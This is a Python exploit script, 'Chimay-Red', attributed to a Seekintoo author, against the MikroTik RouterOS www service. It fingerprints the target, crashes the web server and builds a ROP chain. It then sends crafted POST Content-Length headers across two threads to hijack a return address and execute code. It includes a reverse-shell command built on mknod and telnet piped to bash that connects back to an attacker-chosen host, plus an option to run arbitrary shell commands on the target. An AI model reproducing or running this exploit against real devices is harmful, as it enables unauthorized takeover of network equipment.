#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MikroTik www service exploit by Dayton Pidhirney @ Seekintoo LTD.

TODO: Implement --leakrounds and missing associated logic
"""

__author__ = "Dayton Pidhirney <dpidhirney@seekintoo.com>"
__version__ = "0.0.1"
__license__ = "MIT"

import argparse
import os
import random
import re
import socket
import time
import typing
from collections import namedtuple

from pwn import log, context, listen

import mikrodb
from lib.defines import (
    VECTORS, TARGET, PROFILING, CWD, TRACEFILES, PORTS, SUPPORTED_ARCHS)
from lib.gdb_helper import run_new_remote_gdbserver, attach_gdb_server
from lib.leaker import MikroLeaker
from lib.rop import MikroROP
from lib.utils import (
    mndp_scan,
    create_socket,
    craft_post_header,
    get_system_routes,
    check_cidr_overlap)
from lib.versions import ros_version_ranges

if PROFILING:
    import cProfile
    import tracemalloc
    from lib.utils import display_top


class PrintHelpException(Exception):
    def __init__(self, exception):
        super().__init__(exception)
        log.critical(str(exception))
        raise SystemExit(PARSER.print_help())


def connectable(addr) -> bool:
    """

    :param addr:
    :return:
    """
    sock = None
    is_connectable = False
    with log.progress("Testing target connection") as progress:
        try:
            sock = create_socket(addr, 80)
        except ConnectionAbortedError:
            progress.failure("FAILED!")
        else:
            is_connectable = True
            progress.success("SUCCESS!")
        finally:
            if sock:
                sock.close()

    return is_connectable


def exploitable(version: str) -> bool:
    """

    :param version:
    :return:
    """
    is_exploitable = True
    supported_versions = ros_version_ranges(())

    versions = [int(v) for v in version.split(".")]
    if versions[0] != supported_versions.maximum_major:
        is_exploitable = False
    elif versions[1] > supported_versions.maximum_minor:
        is_exploitable = False
    elif len(versions) == 3:
        if versions[2] > supported_versions.maximum_build:
            is_exploitable = False

    return is_exploitable


def get_remote_architecture(addr):
    """

    :param addr:
    :return:
    """
    if not isinstance(addr, str):
        raise TypeError("expected type str for addr, got {0}".format(type(addr)))

    architecture = None

    mndp_scanner = mndp_scan()
    with log.progress("Discovering remote target architecture | CTRL+C to skip") as progress:
        try:
            while True:
                beacon = next(mndp_scanner)
                if beacon.get(addr) and beacon[addr].get("hardware"):
                    architecture = beacon[addr]["hardware"].decode()
                    break
        except StopIteration as e:
            progress.failure("skipped")
            raise e
        else:
            progress.success(architecture)

    return architecture


def get_remote_version() -> [typing.Union[bytes, str]]:
    """

    :return:
    """

    cnx = None
    port = None
    version = None

    with log.progress("Discovering remote target version") as progress:
        for portnum in PORTS.values():
            try:
                if isinstance(portnum, int):
                    cnx = create_socket(TARGET.rhost, portnum)
                elif isinstance(portnum, (tuple, list)):
                    for subport in portnum:
                        cnx = create_socket(TARGET.rhost, subport)
                        break
            except ConnectionError:
                continue
            else:
                port = portnum
                break

        if port in PORTS["HTTP_PORT"]:  # HTTP
            version_rec = re.compile(r".*RouterOS.*v(\d+.\d+.\d+|\d.\d+)")
            cnx.send(b"GET / HTTP/1.1\r\n\r\n"), tuple(map(str, cnx.read(65535)))  # read garbage for continuation
        elif port == PORTS["FTP_PORT"] or PORTS["TELNET_PORT"]:  # FTP/TELNET
            version_rec = re.compile(r"\(MikroTik (\d.\d+.\d|\d.\d+)\)")
        elif port == PORTS["SSH_PORT"]:  # SSH
            raise NotImplementedError("No know method of version retreival known for ROSSSH")
        else:
            raise NotImplementedError("No known method of version retreival known for port: " + str(port))

        for line in cnx.read(65535).decode().split(cnx.newline.decode()):
            version_match = version_rec.search(line)
            if version_match:
                version = version_match.groups()[0]
                progress.success(version)
                break

        if not version:
            progress.failure()

    cnx.close()

    return version


class Command(object):
    """
    ChimayRed Command Class
    """

    __commands__ = (
        "bindshell",
        "connectback",
        "download_and_exe",
        "ssl_download_and_exe",
        "write_devel",
        "write_devel_read_userfile",
        "custom_shellcode",
        "custom_shell_command",
        "do_crash"
    )

    def __init__(self, *args, command="default"):
        (getattr(self, command))(*args)

    @staticmethod
    def bindshell(vector, *args):
        log.error("Command: bindshell currently not implemented in this version")

    @staticmethod
    def connectback(vector, *args):
        """

        :param vector:
        :param args:
        :return:
        """
        # Assign a ephemeral port and check current usage
        port = random.randint(49152, 65535)
        while socket.socket().connect_ex((args[1], port)) == 1:
            port = random.randint(49152, 65535)

        listener = listen(bindaddr=args[1], port=port)
        revshell_cmd = "mknod /tmp/pipe p;telnet {lhost} {port}</tmp/pipe|bash>/tmp/pipe".format(
            lhost=args[1], port=port)

        throw_v6(vector, revshell_cmd)

        listener.wait_for_connection()
        log.success("Got connect back from target, exploit succeded!")

        return listener.interactive()

    @staticmethod
    def download_and_exe(vector, *args):
        log.error("Command: download_and_exe currently not implemented in this version. Coming in June!")

    @staticmethod
    def ssl_download_and_exe(vector, *args):
        log.error("Command: ssl_download_and_exe currently not implemented in this version. Coming in June!")

    @staticmethod
    def write_devel(vector, *args):
        log.error("Command: write_devel currently not implemented in this version. Coming in June!")

    @staticmethod
    def write_devel_read_userfile(vector, *args):
        log.error("Command: write_devel_read_userfile currently not implemented in this version. Coming in June!")

    @staticmethod
    def custom_shellcode(vector, *args):
        log.error("Command: custom_shellcode currently not implemented in this version. Coming in June")

    @staticmethod
    def custom_shell_command(vector, *args):
        return throw_v6(vector, args[2])

    @staticmethod
    def do_crash():
        """
        :return:
        """
        is_crashed = False
        connections = [create_socket(TARGET.rhost, TARGET.rport)] * 2

        connections[0].send(craft_post_header(length=(-0x1)))
        connections[0].send(b"A" * 1000)
        connections[0].close()

        try:
            connections[1].send("A" * 10)
        except EOFError:
            is_crashed = True

        return is_crashed


def throw_v6(vector, command):
    threads = 2
    connections = list()
    ropper = MikroROP(context.binary, command=command)

    if not connectable(TARGET.rhost):
        log.error("Cannot communicate with target, you sure it's up?")

    TARGET.version = get_remote_version()

    if not exploitable(TARGET.version):
        log.error("{} is not exploitable!".format(TARGET.rhost))

    if not TARGET.architecture:
        try:
            # attempt to remotely retreive the target architecture if available target location available in route table
            for route in get_system_routes():
                if check_cidr_overlap(route, "{}.0/24".format(".".join(TARGET.rhost.split(".")[:-1]))):
                    log.success("Found target in route table range: {}/24".format(route))
                    TARGET.architecture = get_remote_architecture(TARGET.rhost)
                    break
        except GeneratorExit:
            TARGET.architecture = "x86"
            log.warning("Cannot determine remote target architecture, no route table match")
            log.warning("\tTarget Architecture: [{}] (Fallback)".format(TARGET.architecture))
        except (StopIteration, KeyboardInterrupt):
            TARGET.architecture = "x86"
            log.warning("Skipped architecture detection as requested")
            log.warning("\tTarget Architecture: [{}] (Fallback)".format(TARGET.architecture))

    log.info("Beginning chimay-red [throw_v6] with specs:"
             "\nTarget:       '{target: >5}'"
             "\nCommand:      '{command: >5}'"
             "\nVector:       '{vector: >5}'"
             "\nVersion:      '{version: >5}'"
             "\nArchitecture: '{architecture}'"
             "".format(
                 target=TARGET.rhost,
                 command=command,
                 vector=vector,
                 version=TARGET.version,
                 architecture=TARGET.architecture))

    try:
        if vector == "mikrodb":
            arch_offsets = offsets = None
            # instantiate MikroDB offset lookup helper
            lookuper = mikrodb.MikroDb("lite://mikro.db")
            if not TARGET.version:
                log.error("Could not determinte remote version, cannot proceed for current vector.")
            # fetch offsets from database given architecture and version
            if not lookuper.get("www"):
                log.error("Could not locate www table in database, please build database.")
            else:
                arch_offsets = lookuper["www"].get(TARGET.architecture)
            if not arch_offsets:
                log.error("Could not locate architecture: [{}] in database, please rebuild the database.".format(
                    TARGET.architecture))
            if not arch_offsets.get(TARGET.version):
                log.error("Could not locate version: [{}] in database, please rebuild the database.".format(
                    TARGET.version))
            if not arch_offsets[TARGET.version].get("offsets"):
                log.error("Could not locate offsets for architecture: [{}] and version: [{}] in database, please"
                          " rebuild the database.".format(TARGET.architecture, TARGET.version))
            else:
                offsets = arch_offsets[TARGET.version]["offsets"]
                offsets = namedtuple("offsets", sorted(offsets))(**offsets)  # Quick lil conversion

            ropper.build_ropchain(offsets=offsets)
        elif vector == "leak":
            log.info("Attempting to leak pointers from remote process map...")
            # instantiate memory leaker helper object class
            leaker = MikroLeaker(context)
            leaker.leak()
            leaker.analyze_leaks()
        elif vector == "build" or "default":
            ropper.build_ropchain()
        else:
            log.error("developer error occured selecting the proper vector!")

        log.info("Crashing target initially for reliability sake...")
        while not Command(command="do_crash"):
            continue
        with log.progress("Successfully crashed! Target webserver will be back up in") as progress:
            for tick in reversed(range(1, 4)):
                progress.status("{0} seconds...".format(tick))
                time.sleep(1)
            progress.success("UP")

        log.info("Allocating {0} threads for main payload...".format(threads))
        [connections.append(create_socket(TARGET.rhost, TARGET.rport)) for _ in range(threads)]

        log.info("POST content_length header on thread0 to overwrite thread1_stacksize + skip_size + payload_size")
        connections[0].send(craft_post_header(length=0x20000 + 0x1000 + len(ropper.chain) + 1))
        time.sleep(0.5)

        log.info("Incrementing POST read() data buffer pointer on thread0 to overwrite return address on thread1")
        connections[0].send(b'\x90' * (((0x1000 - 0x10) & 0xFFFFFF0) - (context.bits >> 3)))
        time.sleep(0.5)

        log.info("POST content_length header on thread1 to allocate maximum space for payload: ({}) bytes".format(
            len(ropper.chain) + 1))
        connections[1].send(craft_post_header(length=len(ropper.chain) + 1))
        time.sleep(0.5)

        log.info("Sending ROP payload...")
        connections[0].send(ropper.chain)
        time.sleep(0.5)

        log.info("Closing connections sequentially to trigger execution...")
        [connection.close() for connection in connections]
    except KeyboardInterrupt:
        raise SystemExit(log.warning("SIGINT received, exiting gracefully..."))
    except Exception:
        raise

    return True


def profile_main():
    """

    :return:
    """
    log.info("Profiling: ENABLED")
    # Enable memory usage profiling at the line level
    tracemalloc.start()
    # Enable CPU usage/function call timing/rate at the function level
    # Automatigically dumps profile to `filename` for further analysis
    cProfile.run("main()", filename=(CWD + "/chimay-red.cprof"))
    # Take snapshot of traced malloc profile
    snapshot = tracemalloc.take_snapshot()
    # Print snapshot statistics filtering for only `tracefiles`
    display_top(snapshot, limit=20, modpaths=TRACEFILES)

    return 0


def main():
    """ DocstringNotImplemented """

    # set pwntools context for binary file
    if TARGET.binary:
        context.binary = TARGET.binary
    if TARGET.debug:
        # Setup pwnlib context for tmux debug automation
        context.terminal = ['tmux', '-L', 'chimay-red', 'splitw', '-v', '-p', '50']
        # run remote gdbserver attached to `www` PID on TARGET
        run_new_remote_gdbserver(TARGET.rhost, TARGET.gdbport)
        # attach and connect to remote gdbserver on TARGET
        attach_gdb_server(TARGET.rhost, TARGET.gdbport, TARGET.binary, TARGET.breakpoints.split(","))

    if TARGET.shellcommand:
        Command(TARGET.vector, TARGET.rhost, TARGET.lhost, TARGET.shellcommand, command="custom_shell_command")
    else:
        Command(TARGET.vector, TARGET.rhost, TARGET.lhost, command=TARGET.command)


# Run the script
if __name__ == '__main__':
    PARSER = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=u"""
Commands:
    COMMAND                    FUNCTION
    
    bindshell                    create a bindshell
    connectback                  create a reverse shell
    download_and_exe             connect back and download a file to then execute
    ssl_download_and_exe         connect back and download a file via SSL to then execute
    write_devel                  write "devel-login" file to allow developer account login
    write_devel_read_userfile    in addition to enabling developer logins, read back the users file
    
    custom_shellcode             run arbitrary shellcode from `--shellcode` binfile
    custom_shell_command         run a arbitrary $sh one liner on the target
    
Vectors:
    default: (mikrodb)

    [Generic]
        mikrodb:
            use the accompanying mikrodb database to load offsets 
            based off of detected remote version to build a ROP chain.
    
        build:
            build a ROP chain from scratch given the www binary matching
            the remote version running.
    
    [Experimental]
        leak:
            leak pointers from shared libraries to give better odds of
            finding base offset of uclibc.
            
Examples:

    Running simple shell command:
        ./chimay_red.py -v -t 192.168.56.124:80 \\
            --vector=mikrodb     \\
            --lhost=192.168.56.1 \\
            --shellcommand="ls -la" custom_shell_command

    Getting a reverse shell:
        ./chimay_red.py -v -t 192.168.56.124:80 \\
            --vector=mikrodb \\
            --lhost=192.168.56.1 connectback
            
    Debugging the target:
        ./chimay_red.py -v -t 192.168.56.124:80 \\
            --vector=build       \\
            --architecture="x86" \\
            --binary=$PWD/storage/www/www-x86-6.38.4.bin \\
            --debug        \\
            --gdbport=4444 \\
            --lhost=192.168.56.1 connectback
    

==================================================
|  _______   _                     ___         __|
| / ___/ /  (_)_ _  ___ ___ ______/ _ \___ ___/ /|
|/ /__/ _ \/ /  ' \/ _ `/ // /___/ , _/ -_) _  / |
|\___/_//_/_/_/_/_/\_,_/\_, /   /_/|_|\__/\_,_/  |
|                      /___/                     |
==================================================
""")

    PARSER.add_argument("command",
                        action="store",
                        default="connectback",
                        help="command function to run on target, see below for options")

    PARSER.add_argument("-t", "--target",
                        action="store",
                        default=None,
                        required=True,
                        help="target address:port")

    PARSER.add_argument("-l", "--lhost",
                        action="store",
                        default=None,
                        required=False,
                        help="specify the connectback* address")

    PARSER.add_argument("--shellcommand",
                        action="store",
                        default=False,
                        help="return interactive shell as main payload (default)")

    PARSER.add_argument("-d", "--debug",
                        action="store_true",
                        default=False,
                        help="enable debugging mode")

    PARSER.add_argument("--breakpoints",
                        action="store",
                        default=None,
                        help="list of comma delimited breakpoint addresses. Eg. 0x800400,0x800404")

    PARSER.add_argument("-a", "--architecture",
                        action="store",
                        default="",
                        help="target architecture (will detect automatically if target in route table range)")

    PARSER.add_argument("--gdbport",
                        action="store",
                        default="4444",
                        help="port to use when connecting to remote gdbserver")

    PARSER.add_argument("--binary",
                        action="store",
                        help="target binary (www)")

    PARSER.add_argument("--shellcode",
                        action="store",
                        help="custom (optional) shellcode payload binary filepath")

    PARSER.add_argument("--vector", action="store",
                        default="build",
                        help="optional vector type, see below for options")

    PARSER.add_argument("--leakrounds",
                        action="store",
                        help="amount of rounds to leak pointers, higher is better, but takes more time")

    PARSER.add_argument("-v", "--verbose",
                        action="store_true",
                        default=0,
                        help="Verbosity mode")

    PARSER.add_argument("--version", action="version",
                        version="%(prog)s (version {version})".format(version=__version__))

    ARGS = PARSER.parse_args()

    try:
        # TARGET COMAND FILTERING
        if ARGS.command not in Command.__commands__:
            raise RuntimeError("command: {0} is not available".format(ARGS.command))
        elif "connectback" in ARGS.command:
            if not ARGS.lhost:
                raise RuntimeError("command: {0} requires additional argument --lhost".format(ARGS.command))

        # TARGET ADDR FILTERING
        if ':' in ARGS.target:
            try:
                socket.inet_aton(ARGS.target.split(":")[0])
            except socket.error:
                raise RuntimeError("ip address is improperly formatted")
            else:
                TARGET.rhost, TARGET.rport = ARGS.target.split(":")
        else:
            raise RuntimeError("improperly formatted address:port specification")

        # DEBUG ARG CHECKING
        if ARGS.debug:
            if not ARGS.gdbport:
                raise RuntimeError("debug mode specified without --gdbport")
            elif not ARGS.gdbport.isdigit():
                raise RuntimeError("gdbport is improperly formatted")
            elif not ARGS.binary:
                raise RuntimeError("debug mode specified without --binary filepath")
            elif not os.path.isfile(ARGS.binary):
                raise RuntimeError("supplied binary could not be found!\n")
            elif ARGS.breakpoints:
                for bp in ARGS.breakpoints.split(","):
                    if not bp.startswith("0x"):
                        raise RuntimeError("improperly formatted breakpoint in --breakpoints")

        # VECTOR ARG CHECKING
        if ARGS.vector not in VECTORS:
            raise RuntimeError("vector: {} is not available".format(ARGS.vector))
        if ARGS.vector.startswith("build"):
            if not ARGS.binary:
                raise RuntimeError("build vector specified without --binary filepath")
            if not os.path.isfile(ARGS.binary):
                raise RuntimeError("supplied binary could not be found!\n")

        # ARCHITECTURE ARG CHECKING
        if not ARGS.architecture:
            log.warning("No architecture specified, defaulting to ({})".format(SUPPORTED_ARCHS[0]))
        elif ARGS.architecture not in SUPPORTED_ARCHS:
            log.error("Unsupported architecture specified")

        # TARGET NAMESPACE SETTING, YEA I USED A GLOBAL NAMESPACE, SUE ME
        for argname, value in vars(ARGS).items():
            setattr(TARGET, argname, value)
    except RuntimeError as exc:
        raise PrintHelpException(exc)

    # PROFILING DETECTION
    if PROFILING:
        raise SystemExit(profile_main())
    else:
        raise SystemExit(main())
else:  # Chimay-Red is not a library!
    raise ImportError
